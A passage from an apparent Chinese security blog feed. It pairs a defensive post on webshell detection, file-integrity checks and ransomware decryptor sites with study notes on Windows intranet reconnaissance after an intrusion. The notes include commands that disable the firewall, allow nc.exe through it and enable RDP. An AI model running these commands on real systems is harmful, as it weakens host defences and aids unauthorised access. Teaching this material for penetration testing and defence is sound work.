title="2.4：在线病毒扫描网站"></a>2.4：在线病毒扫描网站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.virscan.org         //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎     </span><br><span class="line"></span><br><span class="line">https://habo.qq.com             //腾讯哈勃分析系统</span><br><span class="line"></span><br><span class="line">https://virusscan.jotti.org      //Jotti恶意软件扫描系统</span><br><span class="line"></span><br><span class="line">http://www.scanvir.com        //针对计算机病毒、手机病毒、可疑文件等进行检测分析</span><br></pre></td></tr></table></figure><h3 id="2-5：webshell查杀"><a href="#2-5：webshell查杀" class="headerlink" title="2.5：webshell查杀"></a>2.5：webshell查杀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D盾_Web查杀：http://www.d99net.net/index.asp</span><br><span class="line"></span><br><span class="line">河马webshell查杀：http://www.shellpub.com</span><br><span class="line"></span><br><span class="line">深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html</span><br><span class="line"></span><br><span class="line">Safe3：http://www.uusec.com/webshell.zip</span><br></pre></td></tr></table></figure><h1 id="5、常见的Webshell查杀工具"><a href="#5、常见的Webshell查杀工具" class="headerlink" title="5、常见的Webshell查杀工具"></a>5、常见的Webshell查杀工具</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><h2 id="1、D盾-Web查杀"><a href="#1、D盾-Web查杀" class="headerlink" title="1、D盾_Web查杀"></a>1、D盾_Web查杀</h2><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。</p><p>兼容性：只提供Windows版本。</p><p>工具下载地址：<a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1800.jpg" alt="图片"></p><h2 id="2、百度WEBDIR"><a href="#2、百度WEBDIR" class="headerlink" title="2、百度WEBDIR+"></a>2、百度WEBDIR+</h2><p>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放API支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1801.png" alt="图片"></p><h2 id="3、河马"><a href="#3、河马" class="headerlink" title="3、河马"></a>3、河马</h2><p>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持Windows、linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1802.png" alt="图片"></p><h2 id="4、Web-Shell-Detector"><a href="#4、Web-Shell-Detector" class="headerlink" title="4、Web Shell Detector"></a>4、Web Shell Detector</h2><p>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。</p><p>兼容性：提供php/python脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com/">http://www.shelldetector.com/</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1803.png" alt="图片"></p><h2 id="5、CloudWalker（牧云）"><a href="#5、CloudWalker（牧云）" class="headerlink" title="5、CloudWalker（牧云）"></a>5、CloudWalker（牧云）</h2><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性，提供linux版本，Windows 暂不支持。</p><p>在线查杀demo：<a href="https://webshellchop.chaitin.cn/">https://webshellchop.chaitin.cn/</a></p><p>github项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1804.png" alt="图片"></p><h2 id="6、深度学习模型检测PHP-Webshell"><a href="#6、深度学习模型检测PHP-Webshell" class="headerlink" title="6、深度学习模型检测PHP Webshell"></a>6、深度学习模型检测PHP Webshell</h2><p>一个深度学习PHP webshell查杀引擎demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me/">http://webshell.cdxy.me/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1805.png" alt="图片"></p><h2 id="6、在线webshell查杀工具"><a href="#6、在线webshell查杀工具" class="headerlink" title="6、在线webshell查杀工具"></a>6、在线webshell查杀工具</h2><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1806.png" alt="图片"></p><h1 id="6、如何发现隐藏的Webshell后门"><a href="#6、如何发现隐藏的Webshell后门" class="headerlink" title="6、如何发现隐藏的Webshell后门"></a>6、如何发现隐藏的Webshell后门</h1><h2 id="如何在百万行代码里发现隐藏的后门"><a href="#如何在百万行代码里发现隐藏的后门" class="headerlink" title="如何在百万行代码里发现隐藏的后门"></a>如何在百万行代码里发现隐藏的后门</h2><p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来嘛？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p><p>即使是一款拥有99.9%的Webshell检出率的检测引擎，依然可能存在Webshell绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽SEO手法，也很难通过手动检测或工具检测全部识别出来。</p><p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p><h2 id="1、文件MD5校验"><a href="#1、文件MD5校验" class="headerlink" title="1、文件MD5校验"></a>1、文件MD5校验</h2><p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个exe可执行文件，还有一个文件md5值。这个是软件作者在发布软件时，通过md5算法计算出该exe文件的“特征值”。<br>当用户下载软件时，可以使用相同的校验算法计算下载到exe文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的exe文件是正确的。如果两个特征值不同，则认为下载到exe文件是被篡改过的。</p><p>那同理可得，我们可以将所有网站文件计算一次hash值保存，当出现应急情况时，重新计算一次hash值，并与上次保存的hash值进行对比，从而输出新创建的、修改过及删除的文件列表。</p><h2 id="2、diff命令"><a href="#2、diff命令" class="headerlink" title="2、diff命令"></a>2、diff命令</h2><p>在linux中，我们经常使用diff来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -c -a -r cms1 cms2</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1807.png" alt="图片"></p><blockquote><p>备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上－q选项</p></blockquote><h2 id="3、文件对比工具"><a href="#3、文件对比工具" class="headerlink" title="3、文件对比工具"></a>3、文件对比工具</h2><p>Beyond Compare是一套由Scooter Software推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p><p>下载地址：<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a></p><p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p><p>1、双击<code>Beyond Compare</code> ，打开软件主页，选择文件夹比较。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1808.png" alt="图片"></p><p>2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1809.png" alt="图片"></p><p>3、双击具体文件，进入代码对比，找到代码差异部分。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1810.png" alt="图片"></p><h1 id="7、中了勒索病毒，该怎么办"><a href="#7、中了勒索病毒，该怎么办" class="headerlink" title="7、中了勒索病毒，该怎么办"></a>7、中了勒索病毒，该怎么办</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p><p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p><p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p><p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p><p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p><h2 id="勒索病毒搜索引擎"><a href="#勒索病毒搜索引擎" class="headerlink" title="勒索病毒搜索引擎"></a>勒索病毒搜索引擎</h2><p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1811.png" alt="图片"></p><p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒，</span><br><span class="line">http://lesuobingdu.360.cn</span><br><span class="line"></span><br><span class="line">【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</span><br><span class="line">https://guanjia.qq.com/pr/ls/</span><br><span class="line"></span><br><span class="line">【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</span><br><span class="line">https://lesuo.venuseye.com.cn/</span><br><span class="line"></span><br><span class="line">【奇安信】勒索病毒搜索引擎</span><br><span class="line">https://lesuobingdu.qianxin.com/</span><br><span class="line"></span><br><span class="line">【深信服】勒索病毒搜索引擎</span><br><span class="line">https://edr.sangfor.com.cn/#/information/ransom_search</span><br></pre></td></tr></table></figure><h2 id="勒索软件解密工具集"><a href="#勒索软件解密工具集" class="headerlink" title="勒索软件解密工具集"></a>勒索软件解密工具集</h2><p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">【腾讯哈勃】勒索软件专杀工具</span><br><span class="line">https://habo.qq.com/tool/index</span><br><span class="line"></span><br><span class="line">【金山毒霸】勒索病毒免疫工具</span><br><span class="line">http://www.duba.net/dbt/wannacry.html</span><br><span class="line"></span><br><span class="line">【火绒】安全工具下载</span><br><span class="line">http://bbs.huorong.cn/forum-55-1.html</span><br><span class="line"></span><br><span class="line">【瑞星】解密工具下载</span><br><span class="line">http://it.rising.com.cn/fanglesuo/index.html</span><br><span class="line"></span><br><span class="line">【nomoreransom】勒索软件解密工具集</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line"></span><br><span class="line">【MalwareHunterTeam】勒索软件解密工具集</span><br><span class="line">https://id-ransomware.malwarehunterteam.com/</span><br><span class="line"></span><br><span class="line">【卡巴斯基】免费勒索解密器</span><br><span class="line">https://noransom.kaspersky.com/</span><br><span class="line"></span><br><span class="line">【Avast】免费勒索软件解密工具</span><br><span class="line">https://www.avast.com/zh-cn/ransomware-decryption-tools</span><br><span class="line"></span><br><span class="line">【Emsisoft】免费勒索软件解密工具</span><br><span class="line">https://www.emsisoft.com/ransomware-decryption-tools/free-download</span><br><span class="line"></span><br><span class="line">【Github项目】勒索病毒解密工具收集汇总</span><br><span class="line">https://github.com/jiansiting/Decryption-Tools</span><br></pre></td></tr></table></figure><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 蓝队 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 护网 </tag>
            
            <tag> 蓝队 </tag>
            
            <tag> 攻击防守 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《内网安全攻防》学习笔记，第二章-域内信息收集</title>
      <link href="/2020/06/29/ad-information-search/"/>
      <url>/2020/06/29/ad-information-search/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1387951739&auto=1&height=66"></iframe><h2 id="2-1-内网信息搜集概述"><a href="#2-1-内网信息搜集概述" class="headerlink" title="2.1 内网信息搜集概述"></a>2.1 内网信息搜集概述</h2><p>当渗透测试人员进入内网后，面对的是一片“黑暗森林”，所以渗透测试人员首先会对当前所处的网络环境进行判断，通常的判断分为三种。</p><ul><li>我是谁？——对机器角色的判断。</li><li>这是哪？——对目前机器所处网络环境的拓扑结构进行分析和判断。</li><li>我在哪？——对目前机器所处位置区域的判断。</li></ul><h2 id="2-2-搜集本机信息"><a href="#2-2-搜集本机信息" class="headerlink" title="2.2 搜集本机信息"></a>2.2 搜集本机信息</h2><h3 id="1：查询网络配置信息"><a href="#1：查询网络配置信息" class="headerlink" title="1：查询网络配置信息"></a>1：查询网络配置信息</h3><p>获取本机网络配置信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1607.png" alt="图片"></p><h3 id="2：查询操作系统及软件的信息"><a href="#2：查询操作系统及软件的信息" class="headerlink" title="2：查询操作系统及软件的信息"></a>2：查询操作系统及软件的信息</h3><h4 id="（1）查询操作系统和版本信息"><a href="#（1）查询操作系统和版本信息" class="headerlink" title="（1）查询操作系统和版本信息"></a>（1）查询操作系统和版本信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">英文版系统用这条命令：</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Nmae&quot; /C:&quot;OS Version&quot;</span><br><span class="line"></span><br><span class="line">中文版系统用这条命令：</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><h4 id="（2）查看系统体系结构"><a href="#（2）查看系统体系结构" class="headerlink" title="（2）查看系统体系结构"></a>（2）查看系统体系结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1608.png" alt="图片"></p><h4 id="（3）查看安装的软件及版本、路径等"><a href="#（3）查看安装的软件及版本、路径等" class="headerlink" title="（3）查看安装的软件及版本、路径等"></a>（3）查看安装的软件及版本、路径等</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1609.png" alt="图片"></p><h4 id="（4）使用powershell命令，搜集软件的版本信息"><a href="#（4）使用powershell命令，搜集软件的版本信息" class="headerlink" title="（4）使用powershell命令，搜集软件的版本信息"></a>（4）使用powershell命令，搜集软件的版本信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1610.png" alt="图片"></p><h3 id="3：查询本机服务信息"><a href="#3：查询本机服务信息" class="headerlink" title="3：查询本机服务信息"></a>3：查询本机服务信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1611.png" alt="图片"></p><h3 id="4：查询进程列表"><a href="#4：查询进程列表" class="headerlink" title="4：查询进程列表"></a>4：查询进程列表</h3><p>查看当前进程列表和进程用户、分析软件、邮件客户端、vpn和杀毒软件等进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1612.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1613.png" alt="图片"></p><h3 id="5：查看启动程序信息"><a href="#5：查看启动程序信息" class="headerlink" title="5：查看启动程序信息"></a>5：查看启动程序信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1614.png" alt="图片"></p><h3 id="6：查看计划任务"><a href="#6：查看计划任务" class="headerlink" title="6：查看计划任务"></a>6：查看计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1615.png" alt="图片"></p><h3 id="7：查看主机开机时间"><a href="#7：查看主机开机时间" class="headerlink" title="7：查看主机开机时间"></a>7：查看主机开机时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1616.png" alt="图片"></p><h3 id="8：查询用户列表"><a href="#8：查询用户列表" class="headerlink" title="8：查询用户列表"></a>8：查询用户列表</h3><h4 id="（1）查看有那些用户"><a href="#（1）查看有那些用户" class="headerlink" title="（1）查看有那些用户"></a>（1）查看有那些用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1617.png" alt="图片"></p><h4 id="（2）获取本地管理员、包含域用户信息"><a href="#（2）获取本地管理员、包含域用户信息" class="headerlink" title="（2）获取本地管理员、包含域用户信息"></a>（2）获取本地管理员、包含域用户信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1618.png" alt="图片"></p><h4 id="（3）查看当前在线用户"><a href="#（3）查看当前在线用户" class="headerlink" title="（3）查看当前在线用户"></a>（3）查看当前在线用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1619.png" alt="图片"></p><h4 id="（4）列出或断开本地计算机与所连接的客户端之间的会话"><a href="#（4）列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="（4）列出或断开本地计算机与所连接的客户端之间的会话"></a>（4）列出或断开本地计算机与所连接的客户端之间的会话</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h4 id="（5）查询端口列表"><a href="#（5）查询端口列表" class="headerlink" title="（5）查询端口列表"></a>（5）查询端口列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1620.png" alt="图片"></p><h4 id="（6）查询补丁信息"><a href="#（6）查询补丁信息" class="headerlink" title="（6）查询补丁信息"></a>（6）查询补丁信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1621.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1622.png" alt="图片"></p><h4 id="（7）查询本机共享列表"><a href="#（7）查询本机共享列表" class="headerlink" title="（7）查询本机共享列表"></a>（7）查询本机共享列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1623.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1624.png" alt="图片"></p><h3 id="9：查询路由表及所有可用接口的ARP缓冲表"><a href="#9：查询路由表及所有可用接口的ARP缓冲表" class="headerlink" title="9：查询路由表及所有可用接口的ARP缓冲表"></a>9：查询路由表及所有可用接口的ARP缓冲表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1625.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1626.png" alt="图片"></p><h3 id="10：查询防火墙相关配置"><a href="#10：查询防火墙相关配置" class="headerlink" title="10：查询防火墙相关配置"></a>10：查询防火墙相关配置</h3><h4 id="（1）关闭防火墙"><a href="#（1）关闭防火墙" class="headerlink" title="（1）关闭防火墙"></a>（1）关闭防火墙</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本用这条命令：</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">win 2003之后的版本用这条命令：</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h4 id="（2）查看防火墙配置"><a href="#（2）查看防火墙配置" class="headerlink" title="（2）查看防火墙配置"></a>（2）查看防火墙配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1627.png" alt="图片"></p><h4 id="（3）修改防火墙配置"><a href="#（3）修改防火墙配置" class="headerlink" title="（3）修改防火墙配置"></a>（3）修改防火墙配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本，运行指定程序全部连接：</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">win 2003之后的版本用这条：</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot; </span><br><span class="line"></span><br><span class="line">允许 3389 端口放行，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </span><br><span class="line"></span><br><span class="line">自定义防火墙日志储存位置 </span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot; </span><br></pre></td></tr></table></figure><h3 id="11：查看代理配置情况"><a href="#11：查看代理配置情况" class="headerlink" title="11：查看代理配置情况"></a>11：查看代理配置情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1628.png" alt="图片"></p><h3 id="12：查询并开启远程连接服务"><a href="#12：查询并开启远程连接服务" class="headerlink" title="12：查询并开启远程连接服务"></a>12：查询并开启远程连接服务</h3><h4 id="（1）查看远程连接端口"><a href="#（1）查看远程连接端口" class="headerlink" title="（1）查看远程连接端口"></a>（1）查看远程连接端口</h4><p>在 <code>cmd</code> 下使用注册表查询语句，命令如下，得到连接端口为 <code>0xd3d</code>，转换后为 <code>3389</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1629.png" alt="图片"></p><h4 id="（2）在-Windows-Server-2003-中开启-3389-端口"><a href="#（2）在-Windows-Server-2003-中开启-3389-端口" class="headerlink" title="（2）在 Windows Server 2003 中开启 3389 端口"></a>（2）在 Windows Server 2003 中开启 3389 端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h4 id="（3）在Windows-Server-2008和Windows-Server-2012中开启3389端口"><a href="#（3）在Windows-Server-2008和Windows-Server-2012中开启3389端口" class="headerlink" title="（3）在Windows Server 2008和Windows Server 2012中开启3389端口"></a>（3）在Windows Server 2008和Windows Server 2012中开启3389端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span 